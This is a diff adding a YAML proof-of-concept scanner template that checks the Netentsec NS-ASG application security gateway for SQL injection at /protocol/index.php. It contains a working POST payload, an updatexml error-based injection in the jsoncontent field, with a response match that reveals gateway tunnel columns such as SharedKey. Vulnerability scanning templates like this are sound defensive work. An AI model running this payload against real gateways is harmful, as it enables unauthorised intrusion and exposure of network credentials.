@@ -1,0 +1,20 @@
+id: poc-yaml-ns-asg-index-sqli
+info:
+  name: 网康科技 NS-ASG 应用安全网关 protocol/index.php SQL注入漏洞
+  severity: critical
+  tags:
+  - sql-injection
+  finger: ns-asg
+variables:
+  v1: random_str(5)
+requests:
+- method: POST
+  path: /protocol/index.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'jsoncontent={"protocolType":"uploadiscgwtunnel","messagecontent":["1^(updatexml(1,(select+md5(''{{.v1}}'')),1))"]}
+
+    '
+  expression: status_code == 200 && contains(body, substr(md5(v1), 1, 31)) && contains(body,
+    "GWLinkId,SGWName,DGWName,SharedKey,IP,Port")
+transport: http
